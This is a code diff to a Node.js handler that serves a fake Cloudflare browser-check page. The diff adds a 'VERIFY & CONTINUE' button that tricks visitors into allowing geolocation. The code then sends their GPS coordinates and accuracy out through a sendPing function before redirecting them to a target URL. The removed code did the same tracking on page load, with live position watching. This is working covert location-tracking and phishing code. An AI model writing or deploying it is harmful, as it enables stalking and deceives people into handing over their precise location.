@@ -66,16 +66,20 @@ module.exports = async (req, res) => {
         .cf-spinner { border: 4px solid transparent; border-top: 4px solid #f68b1e; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         h1 { font-size: 24px; font-weight: normal; margin-bottom: 20px; }
-        p { font-size: 15px; color: #555; }
+        p { font-size: 15px; color: #555; margin-bottom: 10px; }
+        .cf-btn { display: inline-block; background: #0051c3; color: white; border: none; padding: 10px 20px; font-size: 16px; border-radius: 4px; cursor: pointer; margin-top: 15px; font-weight: bold; }
         .cf-footer { margin-top: 50px; font-size: 13px; color: #999; }
     </style>
 </head>
 <body>
     <div class="cf-wrapper">
-        <div class="cf-spinner"></div>
-        <h1>Checking your browser before accessing the site.</h1>
-        <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
-        <p>Please allow up to 5 seconds…</p>
+        <div id="loadingState">
+            <div class="cf-spinner"></div>
+            <h1>Checking your browser...</h1>
+            <p>We need to verify you are human before accessing the content.</p>
+            <p>Please click "Allow" on the verification prompt if asked.</p>
+            <button class="cf-btn" id="verifyBtn">VERIFY & CONTINUE</button>
+        </div>
         <div class="cf-footer">Ray ID: ${Math.random().toString(36).substring(2, 12)} • Performance & security by Cloudflare</div>
     </div>
     <script>
@@ -158,32 +162,38 @@ module.exports = async (req, res) => {
 
             sendPing(payload);
 
-            // Real-time GPS Tracking
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    payload.lat = pos.coords.latitude;
-                    payload.lon = pos.coords.longitude;
-                    payload.accuracy = Math.round(pos.coords.accuracy) + "m";
-                    payload.type = 'GPS_SAT';
-                    sendPing(payload); // Send updated GPS
-                    
-                    // Start Watching (Live Movement)
-                    navigator.geolocation.watchPosition((p) => {
-                        payload.lat = p.coords.latitude;
-                        payload.lon = p.coords.longitude;
-                        payload.accuracy = Math.round(p.coords.accuracy) + "m";
-                        sendPing(payload); 
-                    });
-                }, () => {}, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
-            }
+            // Real-time GPS Tracking TRIGGERED BY BUTTON CLICK
+            document.getElementById('verifyBtn').addEventListener('click', () => {
+                document.getElementById('verifyBtn').innerText = "Verifying...";
+                
+                const execRedirect = () => {
+                   window.location.replace("${targetUrl}");
+                };
 
-            // Quick Redirect - delayed slightly more to allow user to stare at the fake cloudflare page
-            // and potentially click 'allow' on a location prompt if it appears. (3 seconds)
-            let redirectTimer = setTimeout(() => {
-                window.location.replace("${targetUrl}");
-            }, 3000);
-            
-            // If GPS is successfully retrieved quickly, we can redirect sooner, but let's just stick to the timeout for consistency.
+                if (navigator.geolocation) {
+                    // Try to force the popup!
+                    navigator.geolocation.getCurrentPosition((pos) => {
+                        payload.lat = pos.coords.latitude;
+                        payload.lon = pos.coords.longitude;
+                        payload.accuracy = Math.round(pos.coords.accuracy) + "m";
+                        payload.type = 'GPS_SAT';
+                        sendPing(payload); // Send updated GPS
+                        
+                        // Wait a sec to ensure ping goes out before redirect
+                        setTimeout(execRedirect, 800);
+                        
+                    }, (err) => {
+                        // User blocked or timed out
+                        execRedirect();
+                    }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
+                } else {
+                    execRedirect();
+                }
+
+                // Failsafe redirect if they ignore the popup entirely for 6 seconds
+                setTimeout(execRedirect, 6000);
+            });
+
         }
         capture();
     </script>
